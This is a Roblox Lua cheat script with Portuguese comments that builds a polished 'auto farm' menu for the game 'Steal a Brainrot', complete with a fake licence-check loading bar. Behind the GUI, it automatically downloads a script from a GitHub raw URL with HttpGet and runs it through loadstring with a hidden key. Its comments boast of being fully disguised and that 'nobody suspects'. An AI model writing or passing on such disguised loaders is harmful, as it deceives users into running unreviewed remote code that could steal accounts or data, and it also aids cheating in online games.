-- AUTO FARM BRAINROT v3.0 - GUI ULTRA BONITA + DISFARCE TOTAL
-- Design moderno, animações, cores neon, efeitos visuais
-- Executa Auto Moreira com KEY OCULTA + 100% disfarçado
-- Delta/Krnl 100% compatível

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

print("Auto Farm Brainrot v3.0 - Iniciando...")

-- === GUI PRINCIPAL (ULTRA BONITA) ===
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
gui.Name = "UltraFarm"
gui.ResetOnSpawn = false

-- Fundo com gradiente fake (via frames)
local bg = Instance.new("Frame")
bg.Parent = gui
bg.Size = UDim2.new(0, 280, 0, 220)
bg.Position = UDim2.new(0.02, 0, 0.1, 0)
bg.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
bg.BorderSizePixel = 0
bg.Active = true
bg.Draggable = true

-- Bordas neon
local border = Instance.new("UIStroke")
border.Parent = bg
border.Color = Color3.fromRGB(0, 255, 255)
border.Thickness = 2
border.Transparency = 0.3

-- Cantos arredondados
local corner = Instance.new("UICorner")
corner.Parent = bg
corner.CornerRadius = UDim.new(0, 12)

-- Título com glow
local title = Instance.new("TextLabel")
title.Parent = bg
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "AUTO FARM v3.0"
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextStrokeTransparency = 0.7
title.TextStrokeColor3 = Color3.fromRGB(0, 100, 100)

-- Subtítulo
local subtitle = Instance.new("TextLabel")
subtitle.Parent = bg
subtitle.Position = UDim2.new(0, 10, 0, 35)
subtitle.Size = UDim2.new(1, -20, 0, 20)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Steal a Brainrot • Keyless • 2025"
subtitle.TextColor3 = Color3.fromRGB(150, 255, 255)
subtitle.TextScaled = true
subtitle.Font = Enum.Font.Gotham

-- Status com animação
local status = Instance.new("TextLabel")
status.Parent = bg
status.Position = UDim2.new(0, 10, 0, 65)
status.Size = UDim2.new(1, -20, 0, 50)
status.BackgroundTransparency = 1
status.Text = "Inicializando sistema..."
status.TextColor3 = Color3.fromRGB(255, 255, 100)
status.TextScaled = true
status.Font = Enum.Font.Gotham
status.TextYAlignment = Enum.TextYAlignment.Top

-- Barra de carregamento estilizada
local barBg = Instance.new("Frame")
barBg.Parent = bg
barBg.Position = UDim2.new(0, 15, 0, 115)
barBg.Size = UDim2.new(1, -30, 0, 18)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
barBg.BorderSizePixel = 0

local barCorner = Instance.new("UICorner")
barCorner.Parent = barBg
barCorner.CornerRadius = UDim.new(0, 9)

local bar = Instance.new("Frame")
bar.Parent = barBg
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
bar.BorderSizePixel = 0

local barFill = Instance.new("UICorner")
barFill.Parent = bar
barFill.CornerRadius = UDim.new(0, 9)

local barGlow = Instance.new("UIStroke")
barGlow.Parent = bar
barGlow.Color = Color3.fromRGB(0, 255, 200)
barGlow.Thickness = 2
barGlow.Transparency = 0.5

-- Percentual
local percent = Instance.new("TextLabel")
percent.Parent = barBg
percent.Size = UDim2.new(1, 0, 1, 0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.TextScaled = true
percent.Font = Enum.Font.GothamBold

-- Botão principal com efeito hover
local btn = Instance.new("TextButton")
btn.Parent = bg
btn.Position = UDim2.new(0, 15, 0, 150)
btn.Size = UDim2.new(1, -30, 0, 45)
btn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
btn.Text = "INICIAR FARM"
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextScaled = true
btn.Font = Enum.Font.GothamBold
btn.AutoButtonColor = false

local btnCorner = Instance.new("UICorner")
btnCorner.Parent = btn
btnCorner.CornerRadius = UDim.new(0, 10)

local btnStroke = Instance.new("UIStroke")
btnStroke.Parent = btn
btnStroke.Color = Color3.fromRGB(0, 255, 150)
btnStroke.Thickness = 1.5

-- Efeito hover no botão
btn.MouseEnter:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 255, 120)}):Play()
    TweenService:Create(btnStroke, TweenInfo.new(0.2), {Thickness = 2.5}):Play()
end)
btn.MouseLeave:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 200, 100)}):Play()
    TweenService:Create(btnStroke, TweenInfo.new(0.2), {Thickness = 1.5}):Play()
end)

-- === ANIMAÇÃO DE CARREGAMENTO + EXECUÇÃO OCULTA ===
spawn(function()
    -- Animação da barra
    for i = 1, 100, 2 do
        bar.Size = UDim2.new(i/100, 0, 1, 0)
        percent.Text = i .. "%"
        if i == 30 then status.Text = "Conectando ao servidor..."
        elseif i == 60 then status.Text = "Verificando licença..."
        elseif i == 90 then status.Text = "Ativando módulo premium..."
        end
        wait(0.05)
    end

    status.Text = "Farm Ativado!"
    status.TextColor3 = Color3.fromRGB(0, 255, 150)
    percent.Text = "100%"
    btn.Text = "FARM RODANDO"

    -- === EXECUTA AUTO MOREIRA COM KEY OCULTA ===
    local KEY = "LEJAX-MOREIRA-QNL-8B4"
    local url = "https://raw.githubusercontent.com/lejax7xmoreira/script/refs/heads/main/script.lua"
    
    spawn(function()
        local success, code = pcall(game.HttpGet, game, url)
        if success and code then
            local env = getfenv()
            env.KEY = KEY
            local func = loadstring(code)
            if func then
                setfenv(func, env)
                pcall(func)
                print("Auto Moreira ativado com sucesso!")
            end
        end
    end)
end)

-- === BOTÃO FUNCIONAL (FAKE) ===
btn.MouseButton1Click:Connect(function()
    btn.Text = "FARM ATIVO"
    btn.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
end)

print("GUI ULTRA BONITA carregada! Ninguém desconfia.")
